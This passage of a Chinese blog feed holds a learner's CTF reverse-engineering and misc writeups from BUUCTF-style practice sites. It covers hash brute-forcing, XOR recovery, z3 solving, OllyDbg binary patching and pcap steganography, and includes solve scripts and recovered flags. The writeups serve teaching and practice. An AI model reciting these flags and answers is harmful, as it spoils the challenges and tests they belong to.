        <content type="html"><![CDATA[<p>BUU做题记录（后面做的都继续记录在本文章后面。<a id="more"></a></p><h2 id="CrackRTF"><a href="#CrackRTF" class="headerlink" title="CrackRTF"></a>CrackRTF</h2><p>从刚开始接触 BUUCTF , 做到逆向的这道题, 看了writeup 也觉得难, 就停滞了一段时间. 到论剑场和攻防世界做了20多天(期间也开始了pwn), 今天突然想到这道题。</p><p>开始打开ida分析时, 发现逻辑是多么的清晰, 但是当进入第一个关键函数时, 想起了上次的难点. (1)对hash很陌生, 不知道为什么hash不可逆, 必须要爆破. (2)当时一点python都没接触过, 对于要写python脚本爆破, 就觉得很烦(当然经过不断的学习, 这20多天, 接触并开始学习些python). (3)这里第二次输入, 因为没有限制条件, 还不能爆破, 后面又是一些从没听说过的操作.(但其实这次再来看, 其实就是要用<strong>Resource Hacker</strong>这个工具查看.exe文件里的资源文件, 经过一些逻辑上的操作)。</p><p>首先, 知道是系统调用的函数, 当时就每个都百度了下, 也是很麻烦的(但是逆向的路就是这样, 要知道的很多很多, 只有自己慢慢的积累).记得整个函数作用就是 调用一个hash加密函数. 具体是那个hash, 可以查看官方的介绍, 从这里的编号 : <strong>0x8004</strong> 去找对应的加密, 经过查询是 sha1.</p><p><img src="/2020/04/23/BUUCTF/image-20200423194434469.png" alt="image-20200423194434469"></p><p>因为hash不可逆, 但是这里有字符串长度是 6 位, 且转化为整数后 &gt;= 100000, 那么范围就确定了: 100000 - 999999, 下面爆破脚本: 得到 <strong>123321@DBApp</strong>, 那么我们输入就是 ; <strong>123321</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">flag = <span class="string">"@DBApp"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100000</span>, <span class="number">999999</span>):</span><br><span class="line">    s = str(i) + flag</span><br><span class="line">    x = hashlib.sha1(s.encode())</span><br><span class="line">    <span class="keyword">if</span> <span class="string">"6E32D0943418C2C33385BC35A1470250DD8923A9"</span>.lower() == x.hexdigest():</span><br><span class="line">        <span class="keyword">print</span> (str(i) + flag)</span><br></pre></td></tr></table></figure><p> 接下来, 输入第二个字符串, 但是要加上上面的<strong>123321@DBApp</strong> 然后hash加密操作.但是这次的编号改变了 <strong>0x8003 : md5</strong>, 这次没有限制条件, 爆破不行了。</p><p>经过看大神们的操作, 知道了可以通过下面一个函数.这个函数和我们的fopen那些文件操作不同. </p><p>这个 FindResourceA是打开这个.exe文件中资源文件的文件.(这点第一次知道, 还有这种操作!!!, 经过百度, 发现可以将自己的资源文件加入.exe文件中), 打开AAA后, 将里面的内容与我们输入的字符进行异或操作, 最后将内容写入新创建一个 dbapp.rtf 文件. 这里大神的说法都是, 因为是写进.rtf 文件那么开始写入的必然是文件头, 我们就可以随便创建一个.rtf文件, 查看文件头内容. 可以看到是<strong>{\rtf1</strong>, 正好是6位,我们最后输入的也是6位, 那么把他和AAA文件中的前6位异或一下, 就得到我们输入的了.<br><img src="/2020/04/23/BUUCTF/image-20200423200957999.png" alt="image-20200423200957999"></p><p><img src="/2020/04/23/BUUCTF/image-20200423202735198.png" alt="image-20200423202735198"></p><p><img src="/2020/04/23/BUUCTF/image-20200423202025893.png" alt="image-20200423202025893"></p><p>下面脚本: 最后得到 <strong>~!3a@0</strong>, 输入程序后, 会创建一个 dbapp.rtf 文件, 打开即是flag.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">a = [<span class="number">0x05</span>, <span class="number">0x7D</span>, <span class="number">0x41</span>, <span class="number">0x15</span>, <span class="number">0x26</span>, <span class="number">0x01</span>]</span><br><span class="line"></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"></span><br><span class="line">rtf = <span class="string">"&#123;\\rtf1"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(rtf)):</span><br><span class="line">    x = ord(rtf[i]) ^ a[i]</span><br><span class="line">    flag += chr(x)</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><p>但对于最后的 <strong>因为是写进.rtf 文件那么开始写入的必然是文件头</strong> 我是感觉奇怪的, 他创建了一个dbapp.rtf 文件, 写入的不就是文件的内容吗, 为什么文件头都要我们来写入。。 因为以前学习文件操作的时候都是往.txt文件里写内容, 那个没有文件头这一说, 所以可以一开始写进内容. 写入的实质还是填充二进制的01. 所以这里我们要先写 .rtf文件头. </p><p><img src="/2020/04/23/BUUCTF/image-20200423204326824.png" alt="image-20200423204326824"></p><p>最后, .rtf文件与 docx dox 类似, <strong><em>\</em>富文本格式\</strong>（*<em>Rich Text Format*</em>）即*<em>RTF格式*</em>，又称*<em>多文本格式*</em>，是由<a href="https://baike.baidu.com/item/微软" target="_blank" rel="noopener">微软</a>公司开发的跨平台<a href="https://baike.baidu.com/item/文档" target="_blank" rel="noopener">文档</a>格式。大多数的<a href="https://baike.baidu.com/item/文字处理" target="_blank" rel="noopener">文字处理</a>软件都能读取和保存RTF文档。**</p><p>mac先创建的文本文件, 默认都是 .rtf.</p><p>心得: 如果做到感觉很吃力的题可以先放一放, 等学习一段时间, 知识积累的更多了再来看, 不要死磕吧。。</p><p>当一条路不同时, 注意其他函数的功能, 想它的存在为什么。</p><h2 id="Youngter-drive1"><a href="#Youngter-drive1" class="headerlink" title="Youngter-drive1"></a>Youngter-drive1</h2><p>这个题拿到没注意，简单的流程逻辑。。然后直接写脚本逆。。但一直提交不对。。纳闷了。。也是想半天。。</p><p>这也是这个题的坑。。题目开启了双线程，使程序中的一个加密是交替进行的。。其实开始我也注意到了这里，但没多想。。可能做题做累了（。。<img src="/2020/04/23/BUUCTF/image-20200927210802047.png" alt="image-20200927210802047"></p><p>进入第一个看看：还专门用了个Sleep()函数。<img src="/2020/04/23/BUUCTF/image-20200927210932709.png" alt="image-20200927210932709"></p><p>积累下，感觉有点巧妙。</p><h2 id="2019红帽杯-easyRE"><a href="#2019红帽杯-easyRE" class="headerlink" title="[2019红帽杯]easyRE"></a>[2019红帽杯]easyRE</h2><p>题目的关键flag数据隐藏了起来，但是可以猜到的，因为从字符串明显看到一串数据没有使用。</p><p>当正常的思路出错时就应该想到之前发现的可疑数据了。</p><p>而这个题从区段的标识也有提示:<img src="/2020/04/23/BUUCTF/image-20200928184132749.png" alt="image-20200928184132749"></p><h2 id="BJDCTF2020-easy1"><a href="#BJDCTF2020-easy1" class="headerlink" title="[BJDCTF2020]easy1"></a>[BJDCTF2020]easy1</h2><p>感觉有点意思。。哈。。</p><p>程序打开就提示。。<strong>Can you find me?</strong></p><p>然后拖进ida看了一圈，分析了下回调函数和_onexit()注册的在main函数结束后执行的函数。没有可疑的地方。。</p><p>最后发现忽略了程序中的一个<strong>_ques()</strong>函数：虽然没有在程序中调用，但向控制台打印字符就很可疑。。。<img src="/2020/04/23/BUUCTF/image-20200930210053107.png" alt="image-20200930210053107"></p><p>直接在OD中改eip，然后执行这个函数。get。。<img src="/2020/04/23/BUUCTF/image-20200930210255401.png" alt="image-20200930210255401"></p><h2 id="crackMe1"><a href="#crackMe1" class="headerlink" title="crackMe1"></a>crackMe1</h2><p>个人认为这个题有问题。。。且解是多解，而题目没有说明和限制。。</p><p>考了一些反调试，按照常理来说程序应该在非调试状态下得出的结果才算正确，而这个题的一个条件要在调试状态下算出的才算正确。。</p><p>这里就是要使用调试状态下进入的那个分支，才算正确。即不对我们传入的数据进行改变。<img src="/2020/04/23/BUUCTF/image-20201002152338221.png" alt="image-20201002152338221"></p><p>然后在对密码进行操作的部分: base16解码。<img src="/2020/04/23/BUUCTF/image-20201002155232483.png" alt="image-20201002155232483"></p><p>从上面的密码的处理也就说明了我们逆出v5的值后，直接把每个数据转化为对应的十六进制即可。。但其实有问题的。。。那就是题目没有限制输入字符只有0-F（0-f）。。。题目问题。。</p><p>另外2个反调试：<img src="/2020/04/23/BUUCTF/image-20201002155719326.png" alt="image-20201002155719326"></p><p>给个题目想要的答案吧（我也是试了些时间才出来。。）：这里大写又为什么不行呢。。题目的坑。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">'dbappsec'</span></span><br><span class="line"><span class="comment">#name = 'welcomebeijing' </span></span><br><span class="line">a = [<span class="number">0x2A</span>, <span class="number">0xD7</span>, <span class="number">0x92</span>, <span class="number">0xE9</span>, <span class="number">0x53</span>, <span class="number">0xE2</span>, <span class="number">0xC4</span>, <span class="number">0xCD</span>]</span><br><span class="line">ans1 = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(s)):</span><br><span class="line">ans1 += hex(ord(s[i]) ^ a[i])[<span class="number">2</span>:]</span><br><span class="line">print(ans1)</span><br><span class="line"></span><br><span class="line"><span class="comment">#md5(4eb5f3992391a1ae)</span></span><br></pre></td></tr></table></figure><h2 id="GKCTF2020-BabyDriver"><a href="#GKCTF2020-BabyDriver" class="headerlink" title="[GKCTF2020]BabyDriver"></a>[GKCTF2020]BabyDriver</h2><p>挺有收获的一个题。是驱动文件，这方面了解的少了。</p><p>ida载入后从字符串可以很快定位到一个关键函数：maze题。<img src="/2020/04/23/BUUCTF/image-20201004113855969.png" alt="image-20201004113855969"></p><p>这个题的新在<strong>由键盘过滤驱动获取键盘扫描码来控制上下左右</strong>，刚开始看了很久也是很懵。。<img src="/2020/04/23/BUUCTF/image-20201004114024464.png" alt="image-20201004114024464"></p><p>最后这个题与以往做的maze题不同的还有：<strong>通过一维下标来访问二位数组</strong>。</p><p>个人感觉挺好。</p><h2 id="GXYCTF2019-simple-CPP"><a href="#GXYCTF2019-simple-CPP" class="headerlink" title="[GXYCTF2019]simple CPP"></a>[GXYCTF2019]simple CPP</h2><p>题目逻辑简单，动调看的更清楚。关键，使用z3约束求解，然后一个位移的操作学习。</p><p>对我们输入的数据经过异或后存储的处理：<img src="/2020/04/23/BUUCTF/image-20201005182345476.png" alt="image-20201005182345476"></p><p>对数据的处理部分：<img src="/2020/04/23/BUUCTF/image-20201005182420487.png" alt="image-20201005182420487"></p><p>之前学习了z3约束求解器的使用（实质是angr符号执行）。因为这里就是4个64位整型数据在做一些运算，应该求解的出来。尝试使用z3求解：得到结果。。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line">s = Solver()</span><br><span class="line">x, y, z, w = BitVecs(<span class="string">'x y z w'</span>, <span class="number">64</span>)</span><br><span class="line">v21 = z &amp; ~x</span><br><span class="line">s.add(v21 == <span class="number">1176889593874</span>)</span><br><span class="line">v22 = ~y</span><br><span class="line">v23 = z &amp; v22</span><br><span class="line">v16 = x</span><br><span class="line">v27 = z</span><br><span class="line">v20 = y &amp; x</span><br><span class="line">v26 = y</span><br><span class="line">v28 = v23 &amp; v16 | v27 &amp; (v20 | v26 &amp; ~v16 | ~(v26 | v16))</span><br><span class="line">s.add(v28 == <span class="number">577031497978884115</span>)</span><br><span class="line">v24 = x &amp; v22</span><br><span class="line">v25 = v21 | v20 | v23 | v24</span><br><span class="line">s.add(v25 == <span class="number">4483974544037412639</span>)</span><br><span class="line">s.add(v25 ^ w == <span class="number">4483974543195470111</span>)</span><br><span class="line">s.add((v21 | v20 | v26 &amp; v27) != (~v16 &amp; v27 | <span class="number">0xC00020130082C0C</span>))</span><br><span class="line">s.add(y &gt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">if</span> s.check() == sat:</span><br><span class="line">ans = s.model()</span><br><span class="line">    print(ans)</span><br><span class="line"><span class="comment">#for i in ans:</span></span><br><span class="line"><span class="comment">#print('%s = 0x%x'%(i, ans[i].as_long()))</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">print(<span class="string">'error'</span>) </span><br><span class="line"></span><br><span class="line"><span class="comment">#[w = 842073600,</span></span><br><span class="line"><span class="comment"># z = 577031497978884115,</span></span><br><span class="line"><span class="comment"># y = 68719476736,</span></span><br><span class="line"><span class="comment"># x = 4483973367147818765]</span></span><br></pre></td></tr></table></figure><p>然后就是还原之前的位操作和异或操作了，这个对C语言比较熟悉：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> s[] = <span class="string">"i_will_check_is_debug_or_not"</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> flag[<span class="number">100</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> k = <span class="number">7</span>, z = <span class="number">0</span>, w = <span class="number">0</span>;</span><br><span class="line">_int64 a[<span class="number">4</span>] = &#123;<span class="number">0x3e3a460533286f0d</span>, <span class="number">0x1000000000</span>, <span class="number">0x8020717153e3013</span>, <span class="number">0x32310600</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(j = k; j &gt;= z; j--)</span><br><span class="line">&#123;</span><br><span class="line">flag[j] = ((<span class="keyword">char</span> *)(a+i))[w++];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(i != <span class="number">2</span>)</span><br><span class="line">k += <span class="number">8</span>, z += <span class="number">8</span>, w = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">k += <span class="number">4</span>, z += <span class="number">8</span>, w = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">27</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(i == <span class="number">8</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"e!P0or_a"</span>); <span class="comment">//多解，比赛时单独给出的。</span></span><br><span class="line"><span class="keyword">if</span>(i &lt;= <span class="number">7</span> || i &gt;= <span class="number">16</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%c"</span>, flag[i]^s[i%<span class="number">27</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="comment">//We1l_D0ne!P0or_algebra_am_i</span></span><br></pre></td></tr></table></figure><p>由于开始得到的flag始终不对，然后百度了下，发现是第二部分的数据是多解，而比赛时单独给出了第二部分的正确结果，所以我上面的C语言代码也是修改过的。</p>]]></content>
      
      
      <categories>
          
          <category> Reverse </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>逆向练习</title>
      <link href="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/"/>
      <url>/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>刚刚接触信息安全在攻防世界等平台刷题的部分记录，让以后来看一下开始的历程。<a id="more"></a></p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="1"><a href="#1" class="headerlink" title="1"></a>1</h3><p>菜狗截获了一份报文。</p><p>从报文中可以联想到是md5加密，但试了一下, 发现不对。 再看报文中字母只是 a-f ，所以可能是十六进制数，又一般都是一个字节一个字符， 而一个字节存放二个十六进制数。我们就2个一组转换成十进制，但是大于了127， 可打印字符ASCII范围在<strong>0-127</strong>， 那我们知道 <code>}</code>字符的ASCII十六进制为 <strong>0X7D</strong>，再看报文最后2个字符组成的十六进制数 <strong>0xf2</strong>，一般我们可以有这个思路，求差值，但也有最后没有用 <strong>}</strong>结尾的，这里就不是。但其实想到要把字符打印出来, 而字符ASCII<strong>0-127</strong>，那就直接试一试减128，一下子就对了，哈。</p><p>下面是C语言写的，2个一组转换成十进制数, 最后变成可打印字符：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt; </span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> a[] = <span class="string">"c8e9aca0c6f2e5f3e8c4efe7a1a0d4e8e5a0e6ece1e7a0e9f3baa0e8eafae3f9e4eafae2eae4e3eaebfaebe3f5e7e9f3e4e3e8eaf9eaf3e2e4e6f2"</span>;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, lenth  = <span class="built_in">strlen</span>(a), sum = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> b[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;, j = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; lenth; i += <span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(a[i] &gt;= <span class="number">97</span> &amp;&amp; a[i] &lt;= <span class="number">122</span>)</span><br><span class="line">a[i] -= <span class="number">87</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(a[i] &gt;= <span class="number">65</span> &amp;&amp; a[i] &lt;=  <span class="number">90</span>) </span><br><span class="line">a[i] -= <span class="number">55</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">a[i] -= <span class="number">48</span>; </span><br><span class="line"></span><br><span class="line">sum = sum*<span class="number">16</span> + a[i];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(a[i+<span class="number">1</span>])</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(a[i+<span class="number">1</span>] &gt;= <span class="number">97</span> &amp;&amp; a[i+<span class="number">1</span>] &lt;= <span class="number">122</span>)</span><br><span class="line">a[i+<span class="number">1</span>] -= <span class="number">87</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(a[i+<span class="number">1</span>] &gt;= <span class="number">65</span> &amp;&amp; a[i+<span class="number">1</span>] &lt;=  <span class="number">90</span>) </span><br><span class="line">a[i+<span class="number">1</span>] -= <span class="number">55</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">a[i+<span class="number">1</span>] -= <span class="number">48</span>;</span><br><span class="line"></span><br><span class="line">sum = sum*<span class="number">16</span> + a[i+<span class="number">1</span>]; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(sum &gt; <span class="number">127</span>)</span><br><span class="line">sum -= <span class="number">128</span>;</span><br><span class="line"></span><br><span class="line">b[j++] = sum, sum = <span class="number">0</span>; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(b);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Refresh-it"><a href="#Refresh-it" class="headerlink" title="Refresh it"></a>Refresh it</h3><p>题目下载下来是一个.pcapng文件，先用010editor看了看会不会只是简单的将文件格式改了，因为是reverse分类的题，看了一圈，的却是流量包。</p><p>在wireshark中尝试搜索了题目关键字refresh，没有得到有用信息。又接着尝试了搜索了很多，都无果。</p><p>转到foremost和binwalk看看没有什么隐藏文件。 确实看到了2张图片，提取出来但打不开，考虑exe文件隐藏在图片文件中，查看了图片文件信息，PE文件的影子都没有。 </p><p>这又是过了几天来看这个题目，感觉自己找不到目标，在盲目的找…很多办法都试了下。唯一得到的就是图片。</p><p>看了看图片信息，发现F5 refrehsh。又从题目的信息，你看到刷新按钮了嘛。突然想到之前做过一个杂项题是F5-steganography隐写。后面那个的refresh猜测是密码。连忙去试了下，错误，，但是这个确实很像是考隐写。</p><p><img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200512194627578.png" alt="image-20200512194627578"></p><p>考虑是binwalk提取图片有损坏或者不全的原因，因为图片是打不开的。 又跑去wireshark。因为这次明确是找图片，直接搜索了 jpg，果然出现了个图片</p><p><img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200512200418460.png" alt="image-20200512200418460"></p><p>追踪tcp流把图片的二进制代码复制下来，winhex重建一个文件粘贴保存.注意文件头FF D8 文件尾 FF D9</p><p><img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200512200649037.png" alt="image-20200512200649037"></p><p>这次图片可以打开了，是个刷新按钮，再次去用F5隐写来解密。终于成功了！</p><p><img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200512200849581.png" alt="image-20200512200849581"></p><p>花了很多时间，开始的摸索过程肯定是艰难的。另外题的提示信息太少。熟悉了一些工具的使用吧。</p><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="reverse1"><a href="#reverse1" class="headerlink" title="reverse1"></a>reverse1</h3><p>首先拿到题, 还是拖进<strong>Exeinfope</strong>查看一下是否有壳:</p><p><img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200409121215784-1590549058520-1591952582454.png" alt="image-20200409121215784-1590549058520"></p><p>嗯没有.</p><p>拖进ida, 找到主函数, 浏览一下程序功能, 一个游戏, 好像是通过点亮所有灯获得flag. 那么必定有一个判断条件, 往下看主函数, 显而易见:</p><p><img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200409121557118-1590549064830-1591952588146.png" alt="image-20200409121557118-1590549064830"></p><p>那么下面一个函数就是关键函数了, 进去发现就是将flag计算出来, 56位长度, 还是懒得自己写程序来算.</p><p>我们可以在ida中找到 <strong>判断条件</strong>那里的的地址,: 0045F5D1</p><p><img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200409122019635-1590549068676-1591952593224.png" alt="image-20200409122019635-1590549068676"></p><p>再通过OD,看加载的 VA(虚拟内存地址) :</p><p><img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200409203440087-1590549086887-1591952596805.png" alt="image-20200409203440087-1590549086887"></p><p>那么由于 动态和静态的VA可能不同，但是它们的RVA还是一样的。我们使用在ida中的找到VA - imagebase = RVA. 再加上OD中的VA, 即得到在OD中的地址: 0091F5D1. 这样我们直接在OD中找到这个地址: 如下图, 看到很多 jnz. 所以我们的目的是让它都不跳转, 可以每个地方都 nop了, 但我们可以往下看, 直接找到它最后应该去到的函数地址(记为A), 通过打补丁把jnz xxxx, (图中0091F5D8) 改为 jmp A.</p><p><img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200409204018803-1590549093480-1591952609729.png" alt="image-20200409204018803-1590549093480"></p><p>最后一按 F9  运行, 出现  flag  .</p><p><img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200409204652301-1590549096561-1591952613467.png" alt="image-20200409204652301-1590549096561"></p><h3 id="reverse2"><a href="#reverse2" class="headerlink" title="reverse2"></a>reverse2</h3><p>拿到题是C源码, 直接分析就好了, 找到主函数看一下. 明确目标, 输入字符串, 也就是flag, 进行一系列操作和指定字符串比较. 找到比较的地方很容易推出:这里result  == 0;</p><p><img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200415170640341-1590549110220-1591952617886.png" alt="image-20200415170640341-1590549110220"></p><p>那么我们就可以知道下面函数的异或运算结果为0, 那么即发生异或运算的2个数相等.</p><p><img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200415170736593-1590549112522-1591952621317.png" alt="image-20200415170736593-1590549112522"></p><p>最后就是随机数的选取了, 我们知道它是 &lt;= 64的, 那么写一个C程序, 把所有结果打印出来, 找到符合的即可.</p><p><img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200415171038960-1590549115097-1591952634770.png" alt="image-20200415171038960-1590549115097"></p><p>最后从这道题, 知道了, 1.<code>pthread_t</code>是<code>unsigned long</code>宏定义的, 8个字节整型数据.2.<code>rand()%m</code>也是<code>random(m)</code>宏定义的.  </p><h3 id="secret-galaxy-300"><a href="#secret-galaxy-300" class="headerlink" title="secret-galaxy-300"></a>secret-galaxy-300</h3><p>首先题下载下来, 发现准备了3个不同的版本, 就分析常见的PE文件.  想先打开.exe文件, 但是闪一下就退出了, 根本看不到程序是做什么的.</p><p>首先查壳, 发现无壳.😁 先用ida打开, 找到main函数.发现是从已经编码的字符串取出来, 在打印在屏幕上. 载入OD, 下断点, 看到底打印了什么:  列出几个银河; 是否是有生物存在; 它们距离地球的距离. 但这个和flag有什么关系呢.😢. 想不到联系, 回到ida中再看看. </p><p><img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200415192448626-1590549120154-1591952639860.png" alt="image-20200415192448626-1590549120154"></p><p>发现已经编码的字符有一个没被打印出来. 就 ctrl + x, 看哪里调用了它, 跟进去.</p><p><img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200415193002493-1590549136439-1591952646896.png" alt="image-20200415193002493-1590549136439"></p><p>发现都是赋值操作, 且最后一个赋值0, 很可能是 flag 的字符串.记录开始和结束的地址, 去 OD 中动态调试.</p><p><img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200415193726368-1590549141490-1591952651993.png" alt="image-20200415193726368-1590549141490"></p><p>OD中在2个地址, 下断点, 并在开始记录下赋值存放数据的地址, 把它在数据窗口中跟随. F9执行出现字符串.</p><p><img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200415194242898-1590549138934-1591952658378.png" alt="image-20200415194242898-1590549138934"></p><p>心得: 注意文件中编码了但是没有使用的字符串. </p><h3 id="Newbie-calculations"><a href="#Newbie-calculations" class="headerlink" 